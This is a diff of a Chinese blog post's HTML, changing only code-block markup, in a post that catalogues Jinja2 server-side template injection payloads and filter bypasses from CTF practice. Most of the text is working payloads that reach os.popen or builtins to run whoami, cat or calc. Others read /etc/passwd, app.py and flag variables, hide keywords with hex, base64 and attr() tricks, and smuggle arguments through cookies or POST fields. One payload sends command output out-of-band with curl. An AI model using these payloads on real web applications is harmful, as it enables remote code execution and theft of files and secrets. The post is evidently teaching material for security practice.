+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;__claAss__&#x27;</span>.replace(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;&quot;</span>)).__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">376</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 <p><code>decode</code>绕过，但这种方法经过测试只能在python2下使用，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__getattribute__(<span class="hljs-string">'X19jbGFzc19f'</span>.decode(<span class="hljs-string">'base64'</span>)).__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">"/etc/passwd"</span>).read()&#125;&#125;
-复制代码</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>替代的方法</li>
 </ul>
 <p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">213</span>].__enter__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'open'</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;
-
-&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">213</span>].__exit__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'open'</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;
-复制代码</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__enter__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__exit__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 <p>过滤config，如果被过滤了可以使用以下的payload绕过</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="hljs-literal">None</span>&gt;
-&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="literal">None</span>&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
 <h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ["></a>过滤 [</h3><p>可以使用<code>__getitem__</code>和<code>pop</code>替代中括号，取列表的第n位</p>
-<div class="hljs"><pre><code class="hljs sqf"><span class="hljs-meta">#getitem、pop</span>
-<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/etc/passwd'</span>).read()
-<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.func_globals.linecache.os.popen(<span class="hljs-string">'ls'</span>).read()
-<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">'__builtins__'</span>).<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">'__import__'</span>)(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'calc'</span>)
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#getitem、pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>.<span class="variable">__getitem__</span>(<span class="number">2</span>).<span class="variable">__subclasses__</span>().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>.<span class="variable">__getitem__</span>(<span class="number">2</span>).<span class="variable">__subclasses__</span>().pop(<span class="number">59</span>).<span class="variable">__init__</span>.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>.<span class="variable">__getitem__</span>(<span class="number">2</span>).<span class="variable">__subclasses__</span>().<span class="variable">__getitem__</span>(<span class="number">59</span>).<span class="variable">__init__</span>.<span class="variable">__globals__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;__builtins__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;().<span class="variable">__class__</span>.<span class="variable">__bases__</span>.<span class="variable">__getitem__</span>(<span class="number">0</span>).<span class="variable">__subclasses__</span>().<span class="variable">__getitem__</span>(<span class="number">433</span>).<span class="variable">__init__</span>.<span class="variable">__globals__</span>.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().<span class="variable">__class__</span>.<span class="variable">__base__</span>.<span class="variable">__subclasses__</span>().pop(<span class="number">433</span>).<span class="variable">__init__</span>.<span class="variable">__globals__</span>.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">0</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">'whoami'</span>).read()&#125;
-
-&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">'whoami'</span>).read()&#125;&#125;</code></pre></div>
-
-<h3 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h3><div class="hljs"><pre><code class="hljs mel">#用&#123;%%&#125;标记
-&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">''</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.<span class="hljs-keyword">popen</span>(<span class="hljs-string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="hljs-string">'p'</span> %&#125;<span class="hljs-number">1</span>&#123;% endif %&#125;
-这样会没有回显,考虑带外或者盲注
-
-# 用&#123;%print%&#125;标记,有回显
-&#123;%print config%&#125;</code></pre></div>
+<h3 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.<span class="keyword">popen</span>(<span class="string">&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line">这样会没有回显,考虑带外或者盲注</span><br><span class="line"></span><br><span class="line"># 用&#123;%print%&#125;标记,有回显</span><br><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>和过滤字符串一样绕过即可</p>
 <p>或编码绕过</p>
 <p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p>
 <h1 id="0x4-实战例子"><a href="#0x4-实战例子" class="headerlink" title="0x4 实战例子"></a>0x4 实战例子</h1><h2 id="过滤-和-和-39"><a href="#过滤-和-和-39" class="headerlink" title="过滤_和.和&#39;"></a>过滤<code>_</code>和<code>.</code>和<code>&#39;</code></h2><p>这里顺便给一个不常见的方法，主要是找到<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">222</span>].get_data(<span class="hljs-number">0</span>,<span class="hljs-string">"app.py"</span>)&#125;&#125;
-复制代码</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 <p>使用十六进制绕过后，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="hljs-string">"\x5F\x5Fbases\x5F\x5F"</span>][<span class="hljs-number">0</span>][<span class="hljs-string">"\x5F\x5Fsubclasses\x5F\x5F"</span>]()[<span class="hljs-number">222</span>][<span class="hljs-string">"get\x5Fdata"</span>](<span class="hljs-number">0</span>, <span class="hljs-string">"app\x2Epy"</span>)&#125;&#125;
-复制代码</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 
 
 
 <h2 id="过滤args和-和"><a href="#过滤args和-和" class="headerlink" title="过滤args和.和_"></a>过滤<code>args</code>和<code>.</code>和<code>_</code></h2><p>之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了<code>attr()</code>绕过点，<code>values</code>绕过<code>args</code>，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;()|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x1'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x2'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x3'</span>])()|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(<span class="hljs-number">40</span>)|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x5'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x6'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x7'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x8'</span>])(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x9'</span>])&#125;&#125;
-
-post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="hljs-string">"os"</span>).popen(<span class="hljs-string">'whoami'</span>).read()
-复制代码</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="导入主函数读取变量"><a href="#导入主函数读取变量" class="headerlink" title="导入主函数读取变量"></a>导入主函数读取变量</h2><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把<code>/flag</code>文件加载到flag这个变量里面了</p>
-<div class="hljs"><pre><code class="hljs python">f = open(<span class="hljs-string">'/flag'</span>,<span class="hljs-string">'r'</span>)
-flag = f.read()</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br></pre></td></tr></table></figure>
 
 <p>我们就可以通过<code>import</code>是导入<code>__main__</code>主函数去读变量，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;%<span class="hljs-keyword">print</span> request.application.__globals__.__getitem__(<span class="hljs-string">'__builtins__'</span>).__getitem__(<span class="hljs-string">'__import__'</span>)(<span class="hljs-string">'__main__'</span>).flag %&#125;</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> request.application.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;__main__&#x27;</span>).flag %&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>对关键字进行base64编码可绕过一些明文检测机制：</p>
-<div class="hljs"><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; import base64
-<span class="hljs-meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="hljs-string">'__import__'</span>)
-<span class="hljs-string">'X19pbXBvcnRfXw=='</span>
-<span class="hljs-meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="hljs-string">'os'</span>)
-<span class="hljs-string">'b3M='</span>
-<span class="hljs-meta">&gt;&gt;</span>&gt; __builtins_<span class="hljs-number">_</span>.__dict_<span class="hljs-number">_</span>[<span class="hljs-string">'X19pbXBvcnRfXw=='</span>.decode(<span class="hljs-string">'base64'</span>)](<span class="hljs-string">'b3M='</span>.decode(<span class="hljs-string">'base64'</span>)).system(<span class="hljs-string">'calc'</span>)
-<span class="hljs-number">0</span></code></pre></div>
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> base64</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span></span><br><span class="line">&#x27;X19pbXBvcnRfXw==&#x27;</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span></span><br><span class="line">&#x27;b3M=&#x27;</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="过滤了-39-“-双花括号-args-values"><a href="#过滤了-39-“-双花括号-args-values" class="headerlink" title="过滤了 &#39;, “, [, ], _, 双花括号,args, values"></a>过滤了 &#39;, “, [, ], _, 双花括号,args, values</h2><p>过滤了单双引号导致调用函数时不能直接使用字符串常量，但是可以使用变量传值，比如cookies或者 headers(不能使用get或方法ost)，过滤下划线可以使用管道符外加调用attr()方法来绕过。</p>
 <p>payload</p>
-<div class="hljs"><pre><code class="hljs django"><span class="xml">url?args=</span>
-<span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span>((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies</span>
-<span class="hljs-template-tag">.c)()|attr(request.cookies.d)</span>
-<span class="hljs-template-tag">(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)</span>
-<span class="hljs-template-tag">(request.cookies.g))(request.cookies.h).read())%&#125;</span>
-<span class="xml">Cookie: h=cat</span>
-<span class="xml">f*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals_</span>
-<span class="xml">_;g=popen</span></code></pre></div>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url?args=</span><br><span class="line">&#123;%pr<span class="built_in">int</span>((()|attr(<span class="built_in">request</span>.cookies.a)|attr(<span class="built_in">request</span>.cookies.b)|attr(<span class="built_in">request</span>.cookies</span><br><span class="line">.c)()|attr(<span class="built_in">request</span>.cookies.d)</span><br><span class="line">(<span class="number">132</span>)|attr(<span class="built_in">request</span>.cookies.e)|attr(<span class="built_in">request</span>.cookies.f)|attr(<span class="built_in">request</span>.cookies.d)</span><br><span class="line">(<span class="built_in">request</span>.cookies.g))(<span class="built_in">request</span>.cookies.h).read())%&#125;</span><br><span class="line">Cookie: h=cat</span><br><span class="line">f*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals_</span><br><span class="line">_;g=popen</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="过滤了-39-“-双花括号-values"><a href="#过滤了-39-“-双花括号-values" class="headerlink" title="过滤了&#39;, “, [, ], _, 双花括号,values"></a>过滤了&#39;, “, [, ], _, 双花括号,values</h2><p>与上面类似</p>
 <p>payload</p>
-<div class="hljs"><pre><code class="hljs stata">url?<span class="hljs-keyword">args</span>=&#123;%<span class="hljs-keyword">print</span>((()|attr(request.<span class="hljs-keyword">args</span>.a)|attr(request.<span class="hljs-keyword">args</span>.b)|attr(request.<span class="hljs-keyword">args</span>.c)()|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">d</span>)(132)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">e</span>)|attr(request.<span class="hljs-keyword">args</span>.f)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">d</span>)(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">g</span>))(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">h</span>).<span class="hljs-keyword">read</span>())%&#125;&amp;<span class="hljs-keyword">h</span>=<span class="hljs-keyword">cat</span>
-f*&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;<span class="hljs-keyword">d</span>=__getitem__&amp;<span class="hljs-keyword">e</span>=__init__&amp;f=__globals_
-_&amp;<span class="hljs-keyword">g</span>=popen</code></pre></div>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url?<span class="keyword">args</span>=&#123;%<span class="keyword">print</span>((()|attr(request.<span class="keyword">args</span>.a)|attr(request.<span class="keyword">args</span>.b)|attr(request.<span class="keyword">args</span>.c)()|attr(request.<span class="keyword">args</span>.<span class="keyword">d</span>)(132)|attr(request.<span class="keyword">args</span>.<span class="keyword">e</span>)|attr(request.<span class="keyword">args</span>.f)|attr(request.<span class="keyword">args</span>.<span class="keyword">d</span>)(request.<span class="keyword">args</span>.<span class="keyword">g</span>))(request.<span class="keyword">args</span>.<span class="keyword">h</span>).<span class="keyword">read</span>())%&#125;&amp;<span class="keyword">h</span>=<span class="keyword">cat</span></span><br><span class="line">f*&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;<span class="keyword">d</span>=__getitem__&amp;<span class="keyword">e</span>=__init__&amp;f=__globals_</span><br><span class="line">_&amp;<span class="keyword">g</span>=popen</span><br></pre></td></tr></table></figure>
 
 <h2 id="过滤了-39-“-双花括号-args"><a href="#过滤了-39-“-双花括号-args" class="headerlink" title="过滤了&#39;, “, [, ], _, 双花括号,args"></a>过滤了&#39;, “, [, ], _, 双花括号,args</h2><p>使用post方法</p>
-<div class="hljs"><pre><code class="hljs vim">url?<span class="hljs-keyword">args</span>=&#123;%<span class="hljs-keyword">print</span>((()|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">a</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">b</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">c</span>)()|attr(request.<span class="hljs-built_in">values</span>.d)(<span class="hljs-number">132</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">e</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">f</span>)|attr(request.<span class="hljs-built_in">values</span>.d)(request.<span class="hljs-built_in">values</span>.g))(request.<span class="hljs-built_in">values</span>.h).<span class="hljs-keyword">read</span>())%&#125;
-POST:h=<span class="hljs-keyword">cat</span> <span class="hljs-keyword">f</span>*&amp;<span class="hljs-keyword">a</span>=__class__&amp;<span class="hljs-keyword">b</span>=__base__&amp;<span class="hljs-keyword">c</span>=__subclasses__&amp;d=__getitem__&amp;<span class="hljs-keyword">e</span>=__init__&amp;<span class="hljs-keyword">f</span>=__globals__&amp;g=popen</code></pre></div>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?<span class="keyword">args</span>=&#123;%<span class="keyword">print</span>((()|attr(request.<span class="built_in">values</span>.<span class="keyword">a</span>)|attr(request.<span class="built_in">values</span>.<span class="keyword">b</span>)|attr(request.<span class="built_in">values</span>.<span class="keyword">c</span>)()|attr(request.<span class="built_in">values</span>.d)(<span class="number">132</span>)|attr(request.<span class="built_in">values</span>.<span class="keyword">e</span>)|attr(request.<span class="built_in">values</span>.<span class="keyword">f</span>)|attr(request.<span class="built_in">values</span>.d)(request.<span class="built_in">values</span>.g))(request.<span class="built_in">values</span>.h).<span class="keyword">read</span>())%&#125;</span><br><span class="line">POST:h=<span class="keyword">cat</span> <span class="keyword">f</span>*&amp;<span class="keyword">a</span>=__class__&amp;<span class="keyword">b</span>=__base__&amp;<span class="keyword">c</span>=__subclasses__&amp;d=__getitem__&amp;<span class="keyword">e</span>=__init__&amp;<span class="keyword">f</span>=__globals__&amp;g=popen</span><br></pre></td></tr></table></figure>
 
 
 
@@ -615,362 +394,7 @@ POST:h=<span class="hljs-keyword">cat</span> <span class="hljs-keyword">f</span>
 
 <p>参考连接：</p>
 <blockquote>
-<p><a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p>
-<p><a href="https://juejin.cn/post/6908600736754434056#heading-18" target="_blank" rel="noopener">细说Jinja2之SSTI&amp;bypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5399">https://xz.aliyun.com/t/5399</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6908600736754434056#heading-18">细说Jinja2之SSTI&amp;bypass</a></p>
 </blockquote>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a>
-                    
-                  </div>
-                
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/02/03/winter-homework/">
-                        <span class="hidden-mobile">winter_homework</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments">
-                
-                
-  <div id="vcomments"></div>
-  <script type="text/javascript">
-    function loadValine() {
-      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#vcomments",
-          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
-          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
-          placeholder: "说点什么吧~~~",
-          path: window.location.pathname,
-          avatar: "retro",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: false,
-          serverURLs: "",
-          master: "4cd096660a71d786a2a4d9d0bb4e8996",
-          friends: "b275f0fc8103331da645a878cf60f841",
-          tagMeta: ["博主","友人","访客"],
-        });
-      });
-    }
-    waitElementVisible('vcomments', loadValine);
-  </script>
-  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
-      powered by Valine.</a></noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
